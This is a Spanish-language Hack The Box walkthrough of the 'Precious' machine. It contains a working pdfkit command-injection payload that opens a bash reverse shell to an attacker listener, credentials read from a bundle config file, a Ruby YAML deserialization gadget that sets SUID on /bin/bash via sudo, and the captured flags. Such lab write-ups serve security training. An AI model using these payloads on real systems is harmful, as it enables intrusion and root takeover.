---
title: Precious Writeup
author: miguel3023
date: 2022-11-27
categories: [Writeup, HTB]
tags: [Linux, CTF, Easy, CommandInjection, Sudoers, RCE]
image:
  path: ../../assets/img/commons/Precious/Precious.png
  width: 800
  height: 450 
---

En esta máquina veremos cómo se acontece un RCE en base a un apartado donde podemos subir archivos, inyectamos comandos para entrar en la máquina y abusamos del privilegio de sudoers para obtener sesión como root 

## Reconocimiento

Primeramente realizamos un escaneo con nmap para detectar los puertos abiertos

```
❯ nmap -p- --min-rate 5000 --open -v -n -Pn 10.129.77.238 -oG OpenPorts
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.92 ( https://nmap.org ) at 2022-11-27 16:16 -05
Initiating SYN Stealth Scan at 16:16
Scanning 10.129.77.238 [65535 ports]
Discovered open port 80/tcp on 10.129.77.238
Discovered open port 22/tcp on 10.129.77.238
Completed SYN Stealth Scan at 16:16, 14.00s elapsed (65535 total ports)
Nmap scan report for 10.129.77.238
Host is up (0.12s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```
Con **whatweb** podemos ver qué tecnologías emplea la web que hay en el puerto 80. Vemos que hay un redirec, entonces incluimos el dominio al **/etc/hosts**

```
❯ whatweb http://10.129.77.238
http://10.129.77.238 [302 Found] Country[RESERVED][ZZ], HTTPServer[nginx/1.18.0], IP[10.129.77.238], 
RedirectLocation[http://precious.htb/], Title[302 Found], nginx[1.18.0]

http://precious.htb/ [200 OK] Country[RESERVED][ZZ], HTML5, HTTPServer[nginx/1.18.0 + Phusion Passenger(R) 6.0.15], 
IP[10.129.77.238], Ruby-on-Rails, Title[Convert Web Page to PDF], UncommonHeaders[x-content-type-options], 
X-Frame-Options[SAMEORIGIN], X-Powered-By[Phusion Passenger(R) 6.0.15], X-XSS-Protection[1; mode=block], nginx[1.18.0]
```

Luego con nmap detectamos la versión y los servicios que están en los puertos que encontramos previamente abiertos

```
❯ nmap -sCV -p22,80 10.129.77.238 -oN targeted
Starting Nmap 7.92 ( https://nmap.org ) at 2022-11-27 16:27 -05
Nmap scan report for 10.129.77.238
Host is up (0.13s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey: 
|   3072 84:5e:13:a8:e3:1e:20:66:1d:23:55:50:f6:30:47:d2 (RSA)
|   256 a2:ef:7b:96:65:ce:41:61:c4:67:ee:4e:96:c7:c8:92 (ECDSA)
|_  256 33:05:3d:cd:7a:b7:98:45:82:39:e7:ae:3c:91:a6:58 (ED25519)
80/tcp open  http    nginx 1.18.0
|_http-title: Did not follow redirect to http://precious.htb/
|_http-server-header: nginx/1.18.0
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
Si nos vamos a la web, podremos ver un convertidor de web a PDF. Si ponemos un servidor con python podemos ver que nos captura lo que tenemos en local y lo convierte a PDF, sin embargo si interceptamos la petición con **BurpSuite** en la respuesta veremos "Generated by pdfkit v0.8.6"

![Burpsuite]({{ 'assets/img/commons/Precious/peticion.png' | relative_url }}){: .center-image }
_Petición por Burp_ 

## Intrusión

Si buscamos vulnerabilidades ante esa versión de **pdfkit** encontramos este [artículo](https://security.snyk.io/vuln/SNYK-RUBY-PDFKIT-2869795) que nos dice cómo explotarla.

Si vemos en [MonkeyPentester](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet) hay una forma de entablarnos una reverse shell con bash, sólo que en este caso le añadimos el **bash -c** para que nos lea el primer argumento y le hacemos la petición al localhost para que nos ejecute ese comando
```
localhost/?name=#{"%20`bash -c 'bash -i >& /dev/tcp/<tuip>/<puerto> 0>&1'`"}
```

Antes de hacer lo anterior debimos estar en escucha con **nc** y obtendremos la shell

```
❯ nc -nlvp 443
listening on [any] 443 ...
connect to [10.10.16.68] from (UNKNOWN) [10.129.77.238] 55796
bash: cannot set terminal process group (679): Inappropriate ioctl for device
bash: no job control in this shell
ruby@precious:/var/www/pdfapp$ 

```
## Privesc

Luego igualamos **TERM** a **xterm** para poder hacer control+L y nos limpie la pantalla


```
ruby@precious:/var/www/pdfapp$ export TERM=xterm
```
Si nos vamos al directorio de **Home** de Ruby podemos ver un directorio ".bundle" oculto al cual si entramos y visualizamos el archivo de configuración encontramos las credenciales de Henry


```
ruby@precious:~/.bundle$ ls
config
ruby@precious:~/.bundle$ cat config 
---
BUNDLE_HTTPS://RUBYGEMS__ORG/: "henry:Q3c1AqGHtoI*******"
ruby@precious:~/.bundle$ 
```

Una vez dentro podremos visualizar la flag de user

```
ruby@precious:~/.bundle$ su henry 
Password: 
henry@precious:/home/ruby/.bundle$ whoami
henry
henry@precious:/home/ruby/.bundle$ cat /home/henry/user.txt 
6b76013c67d712c4d671314833926bc7
henry@precious:/home/ruby/.bundle$
```
Vemos que tenemos permisos de sudoers

```
henry@precious:~$ sudo -l
Matching Defaults entries for henry on precious:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User henry may run the following commands on precious:
    (root) NOPASSWD: /usr/bin/ruby /opt/update_dependencies.rb
henry@precious:~$
```
Visualizamos el **/opt/update_dependencies.rb**

```ruby 
# Compare installed dependencies with those specified in "dependencies.yml"
require "yaml"
require 'rubygems'

# TODO: update versions automatically
def update_gems()
end

def list_from_file
    YAML.load(File.read("dependencies.yml"))
end

def list_local_gems
    Gem::Specification.sort_by{ |g| [g.name.downcase, g.version] }.map{|g| [g.name, g.version.to_s]}
end

gems_file = list_from_file
gems_local = list_local_gems

gems_file.each do |file_name, file_version|
    gems_local.each do |local_name, local_version|
        if(file_name == local_name)
            if(file_version != local_version)
                puts "Installed version differs from the one specified in file: " + local_name
            else
                puts "Installed version is equals to the one specified in file: " + local_name
            end
        end
    end
end
```
Es un script en Ruby y vemos que lee y ejecuta un archivo "dependencies.yml" el cual nosotros crearemos y meteremos un payload para escalar privilegios. Si buscamos por archivos yml payloads encontraremos un [artículo](https://staaldraad.github.io/post/2019-03-02-universal-rce-ruby-yaml-load/) donde al final nos pone un repositorio en [github](https://gist.github.com/staaldraad/89dffe369e1454eedd3306edc8a7e565). Tomamos el segundo payload y lo modificamos para que nos dé permiso SUID en la **/bin/bash**


```ruby 
---
- !ruby/object:Gem::Installer
    i: x
- !ruby/object:Gem::SpecFetcher
    i: y
- !ruby/object:Gem::Requirement
  requirements:
    !ruby/object:Gem::Package::TarReader
    io: &1 !ruby/object:Net::BufferedIO
      io: &1 !ruby/object:Gem::Package::TarReader::Entry
         read: 0
         header: "abc"
      debug_output: &1 !ruby/object:Net::WriteAdapter
         socket: &1 !ruby/object:Gem::RequestSet
             sets: !ruby/object:Net::WriteAdapter
                 socket: !ruby/module 'Kernel'
                 method_id: :system
             git_set: "chmod u+s /bin/bash"
         method_id: :resolve
```
Le damos permisos de ejecución al "dependencies.yml"

```
henry@precious:~$ ls
dependencies.yml  user.txt
henry@precious:~$ chmod +x dependencies.yml
```
Luego ejecutamos con ruby el "/opt/update_dependencies.rb"


```
henry@precious:~$ sudo /usr/bin/ruby /opt/update_dependencies.rb
```
Listo, veremos que el "/bin/bash" tendrá permiso SUID y simplemente ponemos "bash -p" para convertirnos en root y visualizar la flag de root 

```
henry@precious:~$ ls -l /bin/bash 
-rwsr-xr-x 1 root root 1234376 Mar 27  2022 /bin/bash
henry@precious:~$ bash -p
bash-5.1# whoami
root
bash-5.1# cd /root/
bash-5.1# cat root.txt 
9ac4d14553215cb0537bf66d7232f157
bash-5.1#
```
